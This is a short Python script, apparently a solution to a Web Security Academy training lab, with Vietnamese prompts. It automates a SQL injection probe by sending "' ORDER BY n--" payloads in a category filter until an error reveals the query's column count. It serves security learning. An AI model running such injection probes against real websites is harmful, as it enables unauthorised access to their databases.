#Lab: SQL injection UNION attack, determining the number of columns returned by the query
import requests

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    url = f"{base_url}/filter?category=Accessories' ORDER BY {i}--"
    response = requests.get(url)

    if response.status_code == 200:
        print(f"[+] ORDER BY {i} => OK")
        i += 1
    else:
        print(f"[-] ORDER BY {i} => FAIL")
        i -= 1
        break

print(f"[+] Ngon, số cột hợp lệ là: {i}")